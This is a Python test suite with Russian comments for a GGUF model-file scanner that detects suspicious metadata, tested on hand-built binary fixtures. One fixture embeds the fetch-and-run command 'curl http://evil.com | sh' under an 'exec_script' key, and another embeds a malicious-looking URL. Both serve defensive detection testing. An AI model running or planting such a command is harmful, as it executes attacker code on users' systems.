"""Тесты для GGUFScanner.

Все GGUF-файлы создаются вручную через бинарную конструкцию по спецификации:
  [4 байта]    Magic: b'GGUF'
  [uint32 LE]  Version
  [uint64 LE]  tensor_count
  [uint64 LE]  metadata_kv_count
  [kv-пары]    Ключ (uint64+bytes), тип (uint32), значение

Тесты не зависят от сети и внешних зависимостей.
"""

from __future__ import annotations

import struct
from pathlib import Path

import pytest

from poison_check.core.result import MLContext
from poison_check.detectors.gguf_metadata_detector import GGUFMetadataDetector
from poison_check.scanners.gguf_scanner import GGUFScanner

_DUMMY_CTX = MLContext(framework="unknown", confidence=0.0, detected_patterns=[])

# ---------------------------------------------------------------------------
# Вспомогательные функции-строители бинарных fixture
# ---------------------------------------------------------------------------

GGUF_MAGIC = b"GGUF"
GGUF_VERSION_3 = 3
GGUF_VERSION_2 = 2
GGUF_UNKNOWN_VERSION = 99


def _encode_string(s: str) -> bytes:
    """Кодирует строку в GGUF-формат: uint64 length + UTF-8 байты."""
    encoded = s.encode("utf-8")
    return struct.pack("<Q", len(encoded)) + encoded


def _encode_kv_string(key: str, value: str) -> bytes:
    """Кодирует KV-пару со строковым значением."""
    key_bytes = _encode_string(key)
    value_type = struct.pack("<I", 8)  # 8 = string
    value_bytes = _encode_string(value)
    return key_bytes + value_type + value_bytes


def _encode_kv_uint32(key: str, value: int) -> bytes:
    """Кодирует KV-пару с uint32 значением."""
    key_bytes = _encode_string(key)
    value_type = struct.pack("<I", 4)  # 4 = uint32
    value_bytes = struct.pack("<I", value)
    return key_bytes + value_type + value_bytes


def _encode_kv_float32(key: str, value: float) -> bytes:
    """Кодирует KV-пару с float32 значением."""
    key_bytes = _encode_string(key)
    value_type = struct.pack("<I", 6)  # 6 = float32
    value_bytes = struct.pack("<f", value)
    return key_bytes + value_type + value_bytes


def _build_gguf(
    version: int = GGUF_VERSION_3,
    tensor_count: int = 0,
    kv_pairs: list[bytes] | None = None,
) -> bytes:
    """Строит GGUF-файл с указанными параметрами.

    kv_pairs — список уже закодированных KV-пар (через _encode_kv_*).
    """
    if kv_pairs is None:
        kv_pairs = []

    header = GGUF_MAGIC
    header += struct.pack("<I", version)
    header += struct.pack("<Q", tensor_count)
    header += struct.pack("<Q", len(kv_pairs))
    for kv in kv_pairs:
        header += kv
    return header


def _build_minimal_valid() -> bytes:
    """Минимальный валидный GGUF: magic + v3 + 0 тензоров + 2 KV-пары."""
    kv_pairs = [
        _encode_kv_string("general.name", "test-model"),
        _encode_kv_uint32("general.quantization_version", 2),
    ]
    return _build_gguf(version=GGUF_VERSION_3, tensor_count=0, kv_pairs=kv_pairs)


def _build_with_url() -> bytes:
    """GGUF с URL в metadata."""
    kv_pairs = [
        _encode_kv_string("general.name", "suspicious-model"),
        _encode_kv_string(
            "general.source",
            "Downloaded from http://malicious.example.com/models/backdoor",
        ),
    ]
    return _build_gguf(version=GGUF_VERSION_3, kv_pairs=kv_pairs)


def _build_with_ip() -> bytes:
    """GGUF с IP-адресом в metadata."""
    kv_pairs = [
        _encode_kv_string("general.name", "model-with-ip"),
        _encode_kv_string("general.endpoint", "Connect to 192.168.1.100:8080"),
    ]
    return _build_gguf(version=GGUF_VERSION_3, kv_pairs=kv_pairs)


def _build_with_suspicious_key() -> bytes:
    """GGUF с подозрительным ключом 'exec_script' в metadata."""
    kv_pairs = [
        _encode_kv_string("general.name", "model-with-code"),
        _encode_kv_string("exec_script", "curl http://evil.com | sh"),
    ]
    return _build_gguf(version=GGUF_VERSION_3, kv_pairs=kv_pairs)


def _build_unknown_version() -> bytes:
    """GGUF с неизвестной версией 99."""
    kv_pairs = [_encode_kv_string("general.name", "future-model")]
    return _build_gguf(version=GGUF_UNKNOWN_VERSION, kv_pairs=kv_pairs)


def _build_with_long_string(length: int = 15_000) -> bytes:
    """GGUF с аномально длинной строкой в metadata (> 10_000 символов)."""
    long_value = "A" * length
    kv_pairs = [
        _encode_kv_string("general.name", "model-with-long-meta"),
        _encode_kv_string("suspicious_blob", long_value),
    ]
    return _build_gguf(version=GGUF_VERSION_3, kv_pairs=kv_pairs)


def _build_truncated() -> bytes:
    """Обрезанный GGUF: magic + version, но без tensor_count."""
    return GGUF_MAGIC + struct.pack("<I", GGUF_VERSION_3) + b"\x00\x00"


def _build_wrong_magic() -> bytes:
    """Файл с неправильным magic bytes."""
    return b"GGML" + struct.pack("<I", GGUF_VERSION_3) + b"\x00" * 16


def _build_version2_valid() -> bytes:
    """Валидный GGUF версии 2."""
    kv_pairs = [_encode_kv_string("general.name", "v2-model")]
    return _build_gguf(version=GGUF_VERSION_2, kv_pairs=kv_pairs)


def _build_with_array_of_strings() -> bytes:
    """GGUF с array-значением (массив строк)."""
    key_bytes = _encode_string("llama.tensor_data_layout")
    value_type = struct.pack("<I", 9)  # 9 = array
    array_elem_type = struct.pack("<I", 8)  # 8 = string
    array_count = struct.pack("<Q", 2)
    elem1 = _encode_string("layer1")
    elem2 = _encode_string("layer2")
    kv = key_bytes + value_type + array_elem_type + array_count + elem1 + elem2

    kv_pairs_raw = [kv]
    header = GGUF_MAGIC
    header += struct.pack("<I", GGUF_VERSION_3)
    header += struct.pack("<Q", 0)  # tensor_count
    header += struct.pack("<Q", len(kv_pairs_raw))
    for kv_raw in kv_pairs_raw:
        header += kv_raw
    return header


# ---------------------------------------------------------------------------
# Тест 1: минимальный валидный GGUF
# ---------------------------------------------------------------------------


class TestGGUFScannerValid:
    """Базовые тесты валидных GGUF-файлов."""

    def test_valid_minimal_no_error(self, tmp_path: Path) -> None:
        """Минимальный валидный GGUF сканируется без ошибок."""
        f = tmp_path / "model.gguf"
        f.write_bytes(_build_minimal_valid())

        scanner = GGUFScanner()
        result = scanner.scan(f)

        assert result.error is None, f"Ожидался error=None, получен: {result.error!r}"

    def test_valid_metadata_extracted(self, tmp_path: Path) -> None:
        """Сканер извлекает metadata из валидного файла."""
        f = tmp_path / "model.gguf"
        f.write_bytes(_build_minimal_valid())

        result = GGUFScanner().scan(f)

        assert result.metadata is not None
        assert "general.name" in result.metadata
        assert result.metadata["general.name"] == "test-model"

    def test_valid_tensor_count_in_metadata(self, tmp_path: Path) -> None:
        """tensor_count попадает в metadata."""
        f = tmp_path / "model.gguf"
        f.write_bytes(_build_minimal_valid())

        result = GGUFScanner().scan(f)

        assert result.metadata is not None
        assert result.metadata.get("tensor_count") == "0"

    def test_valid_kv_count_in_metadata(self, tmp_path: Path) -> None:
        """kv_count попадает в metadata."""
        f = tmp_path / "model.gguf"
        f.write_bytes(_build_minimal_valid())

        result = GGUFScanner().scan(f)

        assert result.metadata is not None
        assert result.metadata.get("kv_count") == "2"

    def test_valid_hashes_computed(self, tmp_path: Path) -> None:
        """Хеши файла вычисляются для валидного файла."""
        f = tmp_path / "model.gguf"
        f.write_bytes(_build_minimal_valid())

        result = GGUFScanner().scan(f)

        assert "sha256" in result.file_hash
        assert len(result.file_hash["sha256"]) == 64

    def test_valid_scanner_name(self, tmp_path: Path) -> None:
        """scanner_name должен быть 'gguf'."""
        f = tmp_path / "model.gguf"
        f.write_bytes(_build_minimal_valid())

        result = GGUFScanner().scan(f)
        assert result.scanner_name == "gguf"

    def test_valid_version2(self, tmp_path: Path) -> None:
        """GGUF версии 2 сканируется без ошибок."""
        f = tmp_path / "model_v2.gguf"
        f.write_bytes(_build_version2_valid())

        result = GGUFScanner().scan(f)
        assert result.error is None

    def test_valid_strings_populated(self, tmp_path: Path) -> None:
        """Строковые значения metadata попадают в raw_data.strings."""
        f = tmp_path / "model.gguf"
        f.write_bytes(_build_minimal_valid())

        result = GGUFScanner().scan(f)

        assert result.strings is not None
        string_values = [s.value for s in result.strings]
        assert "test-model" in string_values

    def test_uint32_value_parsed(self, tmp_path: Path) -> None:
        """uint32 значение корректно парсится и попадает в metadata."""
        f = tmp_path / "model.gguf"
        f.write_bytes(_build_minimal_valid())

        result = GGUFScanner().scan(f)

        assert result.metadata is not None
        assert result.metadata.get("general.quantization_version") == "2"

    def test_array_of_strings_parsed(self, tmp_path: Path) -> None:
        """Массив строк в metadata парсится без ошибок."""
        f = tmp_path / "model.gguf"
        f.write_bytes(_build_with_array_of_strings())

        result = GGUFScanner().scan(f)

        assert result.error is None
        assert result.metadata is not None
        # Элементы массива должны попасть в strings
        assert result.strings is not None
        string_values = [s.value for s in result.strings]
        assert "layer1" in string_values
        assert "layer2" in string_values


# ---------------------------------------------------------------------------
# Тест 2: GGUF с URL в metadata → URL попадает в strings
# ---------------------------------------------------------------------------


class TestGGUFScannerURL:
    """URL и IP в metadata должны обнаруживаться и попадать в strings."""

    def test_url_in_strings(self, tmp_path: Path) -> None:
        """URL из metadata попадает в raw_data.strings."""
        f = tmp_path / "suspicious.gguf"
        f.write_bytes(_build_with_url())

        result = GGUFScanner().scan(f)

        assert result.strings is not None
        string_values = [s.value for s in result.strings]
        # Строковое значение с URL должно присутствовать
        assert any("http" in v for v in string_values), (
            f"Ожидалась строка с URL в strings, получено: {string_values!r}"
        )

    def test_url_issue_generated(self, tmp_path: Path) -> None:
        """URL в metadata GGUF → детектор возвращает Issue MLS-GGUF-002 (LOW)."""
        f = tmp_path / "suspicious.gguf"
        f.write_bytes(_build_with_url())

        result = GGUFScanner().scan(f)
        issues = GGUFMetadataDetector().analyze(result, _DUMMY_CTX)

        assert any(i.code == "MLS-GGUF-002" for i in issues), (
            f"Ожидался Issue MLS-GGUF-002 (URL), получено: {[i.code for i in issues]}"
        )

    def test_ip_in_strings(self, tmp_path: Path) -> None:
        """IP-адрес из metadata попадает в raw_data.strings."""
        f = tmp_path / "model_ip.gguf"
        f.write_bytes(_build_with_ip())

        result = GGUFScanner().scan(f)

        assert result.strings is not None
        string_values = [s.value for s in result.strings]
        assert any("192.168" in v for v in string_values)

    def test_ip_issue_generated(self, tmp_path: Path) -> None:
        """IP-адрес в metadata GGUF → детектор возвращает Issue MLS-GGUF-003 (LOW)."""
        f = tmp_path / "model_ip.gguf"
        f.write_bytes(_build_with_ip())

        result = GGUFScanner().scan(f)
        issues = GGUFMetadataDetector().analyze(result, _DUMMY_CTX)

        assert any(i.code == "MLS-GGUF-003" for i in issues), (
            f"Ожидался Issue MLS-GGUF-003 (IP), получено: {[i.code for i in issues]}"
        )


# ---------------------------------------------------------------------------
# Тест 3: GGUF с неизвестной версией → Issue INFO
# ---------------------------------------------------------------------------


class TestGGUFScannerUnknownVersion:
    """Неизвестная версия GGUF должна генерировать Issue INFO."""

    def test_unknown_version_issue_info(self, tmp_path: Path) -> None:
        """Версия 99 → детектор возвращает Issue MLS-GGUF-005 с severity=info."""
        f = tmp_path / "future.gguf"
        f.write_bytes(_build_unknown_version())

        result = GGUFScanner().scan(f)

        # Сканер не возвращает ошибку (файл future-compatible) и сохраняет версию.
        assert result.metadata is not None
        assert result.metadata.get("gguf_version") == str(GGUF_UNKNOWN_VERSION)

        # Issue про неизвестную версию формирует детектор.
        from poison_check.core.result import Severity  # noqa: PLC0415

        issues = GGUFMetadataDetector().analyze(result, _DUMMY_CTX)
        version_issues = [i for i in issues if i.code == "MLS-GGUF-005"]
        assert version_issues, (
            f"Ожидался Issue MLS-GGUF-005 (unknown version), "
            f"получено: {[i.code for i in issues]}"
        )
        assert version_issues[0].severity == Severity.INFO

    def test_unknown_version_no_crash(self, tmp_path: Path) -> None:
        """Сканер не бросает исключений при неизвестной версии."""
        f = tmp_path / "future.gguf"
        f.write_bytes(_build_unknown_version())

        result = GGUFScanner().scan(f)
        assert result is not None

    def test_unknown_version_metadata_extracted(self, tmp_path: Path) -> None:
        """При неизвестной версии metadata всё равно извлекается."""
        f = tmp_path / "future.gguf"
        f.write_bytes(_build_unknown_version())

        result = GGUFScanner().scan(f)

        # Metadata должна быть извлечена даже при неизвестной версии
        assert result.metadata is not None
        # Имя модели должно попасть в metadata
        assert "general.name" in result.metadata


# ---------------------------------------------------------------------------
# Тест 4: обрезанный / повреждённый GGUF → не крашится
# ---------------------------------------------------------------------------


class TestGGUFScannerMalformed:
    """Повреждённые GGUF-файлы не должны валить сканер."""

    def test_truncated_header_returns_error(self, tmp_path: Path) -> None:
        """Обрезанный заголовок возвращает RawScanData с error, не падает."""
        f = tmp_path / "truncated.gguf"
        f.write_bytes(_build_truncated())

        result = GGUFScanner().scan(f)

        assert result.error is not None
        assert result is not None  # не упало

    def test_wrong_magic_returns_error(self, tmp_path: Path) -> None:
        """Неправильный magic bytes → error без исключения."""
        f = tmp_path / "wrong_magic.gguf"
        f.write_bytes(_build_wrong_magic())

        result = GGUFScanner().scan(f)

        assert result.error is not None
        assert "magic" in result.error.lower() or "GGUF" in result.error

    def test_empty_file_returns_error(self, tmp_path: Path) -> None:
        """Пустой файл → error без исключения."""
        f = tmp_path / "empty.gguf"
        f.write_bytes(b"")

        result = GGUFScanner().scan(f)

        assert result.error is not None

    def test_only_magic_returns_error(self, tmp_path: Path) -> None:
        """Файл с только magic bytes → error без исключения."""
        f = tmp_path / "magic_only.gguf"
        f.write_bytes(b"GGUF")

        result = GGUFScanner().scan(f)

        assert result.error is not None

    def test_corrupted_kv_count_returns_error(self, tmp_path: Path) -> None:
        """Файл с kv_count=9999999 (нереалистично большой) → error без исключения."""
        header = GGUF_MAGIC
        header += struct.pack("<I", GGUF_VERSION_3)
        header += struct.pack("<Q", 0)  # tensor_count
        header += struct.pack("<Q", 9_999_999)  # kv_count >> MAX_METADATA_COUNT
        f = tmp_path / "huge_kv.gguf"
        f.write_bytes(header)

        result = GGUFScanner().scan(f)

        assert result.error is not None
        # Ошибка должна содержать информацию о превышении лимита
        assert "лимит" in result.error or "limit" in result.error.lower() or "превышает" in result.error

    def test_truncated_kv_data_returns_error(self, tmp_path: Path) -> None:
        """kv_count=5, но данных недостаточно → error без падения."""
        header = GGUF_MAGIC
        header += struct.pack("<I", GGUF_VERSION_3)
        header += struct.pack("<Q", 0)  # tensor_count
        header += struct.pack("<Q", 5)  # kv_count, но пар нет
        # Нет данных KV-пар — только несколько байт мусора
        header += b"\x00\x01\x02\x03"
        f = tmp_path / "truncated_kv.gguf"
        f.write_bytes(header)

        result = GGUFScanner().scan(f)

        assert result.error is not None

    def test_random_bytes_returns_error(self, tmp_path: Path) -> None:
        """Случайные байты не должны крашить сканер."""
        f = tmp_path / "random.gguf"
        f.write_bytes(b"\xde\xad\xbe\xef" * 100)

        result = GGUFScanner().scan(f)

        assert result is not None
        assert result.error is not None  # неверный magic

    def test_malformed_string_length_returns_error(self, tmp_path: Path) -> None:
        """Строка с нереалистичной длиной → error без падения."""
        header = GGUF_MAGIC
        header += struct.pack("<I", GGUF_VERSION_3)
        header += struct.pack("<Q", 0)
        header += struct.pack("<Q", 1)  # одна KV-пара
        # Ключ: длина 999999999, данных нет
        header += struct.pack("<Q", 999_999_999)
        f = tmp_path / "bad_string.gguf"
        f.write_bytes(header)

        result = GGUFScanner().scan(f)

        assert result is not None
        assert result.error is not None


# ---------------------------------------------------------------------------
# Тест 5: подозрительные ключи → Issue MEDIUM
# ---------------------------------------------------------------------------


class TestGGUFScannerSuspiciousKeys:
    """Подозрительные ключи в metadata должны генерировать Issue MEDIUM."""

    def test_suspicious_key_exec_generates_issue(self, tmp_path: Path) -> None:
        """Ключ 'exec_script' → детектор возвращает Issue MLS-GGUF-001 (MEDIUM)."""
        f = tmp_path / "suspicious_key.gguf"
        f.write_bytes(_build_with_suspicious_key())

        result = GGUFScanner().scan(f)

        from poison_check.core.result import Severity  # noqa: PLC0415

        issues = GGUFMetadataDetector().analyze(result, _DUMMY_CTX)
        key_issues = [i for i in issues if i.code == "MLS-GGUF-001"]
        assert key_issues, (
            f"Ожидался Issue MLS-GGUF-001 (suspicious key), "
            f"получено: {[i.code for i in issues]}"
        )
        assert key_issues[0].severity == Severity.MEDIUM

    def test_suspicious_key_string_in_strings(self, tmp_path: Path) -> None:
        """Значение подозрительного ключа попадает в strings."""
        f = tmp_path / "suspicious_key.gguf"
        f.write_bytes(_build_with_suspicious_key())

        result = GGUFScanner().scan(f)

        assert result.strings is not None
        string_values = [s.value for s in result.strings]
        assert any("curl" in v for v in string_values)


# ---------------------------------------------------------------------------
# Тест 6: аномально длинная строка → Issue LOW
# ---------------------------------------------------------------------------


class TestGGUFScannerLongString:
    """Аномально длинные строки должны генерировать Issue LOW."""

    def test_long_string_generates_issue(self, tmp_path: Path) -> None:
        """Строка >10 000 символов → детектор возвращает MLS-GGUF-004 (LOW)."""
        f = tmp_path / "long_string.gguf"
        f.write_bytes(_build_with_long_string(length=15_000))

        result = GGUFScanner().scan(f)

        from poison_check.core.result import Severity  # noqa: PLC0415

        issues = GGUFMetadataDetector().analyze(result, _DUMMY_CTX)
        long_issues = [i for i in issues if i.code == "MLS-GGUF-004"]
        assert long_issues, (
            f"Ожидался Issue MLS-GGUF-004 (long string), "
            f"получено: {[i.code for i in issues]}"
        )
        assert long_issues[0].severity == Severity.LOW

    def test_normal_string_no_issue(self, tmp_path: Path) -> None:
        """Строки нормальной длины не генерируют MLS-GGUF-004."""
        f = tmp_path / "normal.gguf"
        f.write_bytes(_build_minimal_valid())

        result = GGUFScanner().scan(f)
        issues = GGUFMetadataDetector().analyze(result, _DUMMY_CTX)

        assert all(i.code != "MLS-GGUF-004" for i in issues), (
            "Неожиданный Issue MLS-GGUF-004 для нормального файла"
        )


# ---------------------------------------------------------------------------
# Тест 7: can_handle
# ---------------------------------------------------------------------------


class TestGGUFScannerCanHandle:
    """can_handle должен принимать файлы по расширению и magic bytes."""

    def test_can_handle_gguf_extension(self, tmp_path: Path) -> None:
        """can_handle возвращает True для .gguf."""
        f = tmp_path / "model.gguf"
        f.write_bytes(b"")
        assert GGUFScanner.can_handle(f) is True

    def test_can_handle_ggml_extension(self, tmp_path: Path) -> None:
        """can_handle возвращает True для .ggml."""
        f = tmp_path / "model.ggml"
        f.write_bytes(b"")
        assert GGUFScanner.can_handle(f) is True

    def test_can_handle_case_insensitive(self, tmp_path: Path) -> None:
        """can_handle регистронезависим."""
        f = tmp_path / "MODEL.GGUF"
        f.write_bytes(b"")
        assert GGUFScanner.can_handle(f) is True

    def test_cannot_handle_pkl(self, tmp_path: Path) -> None:
        """can_handle возвращает False для .pkl."""
        f = tmp_path / "model.pkl"
        f.write_bytes(b"")
        assert GGUFScanner.can_handle(f) is False

    def test_can_handle_by_magic_bytes(self, tmp_path: Path) -> None:
        """can_handle возвращает True для файла с расширением .bin но magic b'GGUF'."""
        f = tmp_path / "model.bin"
        f.write_bytes(b"GGUF" + b"\x00" * 20)
        assert GGUFScanner.can_handle(f) is True

    def test_cannot_handle_wrong_magic_no_extension(self, tmp_path: Path) -> None:
        """can_handle возвращает False для .bin без GGUF magic bytes."""
        f = tmp_path / "model.bin"
        f.write_bytes(b"PK\x03\x04" + b"\x00" * 20)
        assert GGUFScanner.can_handle(f) is False

    def test_can_handle_nonexistent_file_no_crash(self, tmp_path: Path) -> None:
        """can_handle для несуществующего файла с .gguf расширением возвращает True по расширению."""
        f = tmp_path / "nonexistent.gguf"
        # Файл не создан — определяемся только по расширению
        assert GGUFScanner.can_handle(f) is True


# ---------------------------------------------------------------------------
# Тест 8: сканирование .ggml файла
# ---------------------------------------------------------------------------


class TestGGUFScannerGGMLExtension:
    """Файлы .ggml с GGUF magic bytes должны сканироваться корректно."""

    def test_ggml_file_scanned(self, tmp_path: Path) -> None:
        """Файл с расширением .ggml и содержимым GGUF сканируется корректно."""
        f = tmp_path / "model.ggml"
        f.write_bytes(_build_minimal_valid())

        result = GGUFScanner().scan(f)

        assert result.scanner_name == "gguf"
        assert result.error is None

    def test_ggml_metadata_extracted(self, tmp_path: Path) -> None:
        """Metadata извлекается из .ggml файла."""
        f = tmp_path / "model.ggml"
        f.write_bytes(_build_minimal_valid())

        result = GGUFScanner().scan(f)

        assert result.metadata is not None
        assert "general.name" in result.metadata


# ---------------------------------------------------------------------------
# Тест 9: несуществующий файл
# ---------------------------------------------------------------------------


class TestGGUFScannerMissingFile:
    """Сканирование несуществующего файла должно возвращать error, не падать."""

    def test_missing_file_returns_error(self, tmp_path: Path) -> None:
        """Сканирование несуществующего файла — error, не исключение."""
        f = tmp_path / "does_not_exist.gguf"

        result = GGUFScanner().scan(f)

        assert result.error is not None
        assert result.file_hash == {}

    def test_missing_file_does_not_raise(self, tmp_path: Path) -> None:
        """Сканер не бросает исключений для несуществующего файла."""
        f = tmp_path / "ghost.gguf"
        result = GGUFScanner().scan(f)
        assert result is not None
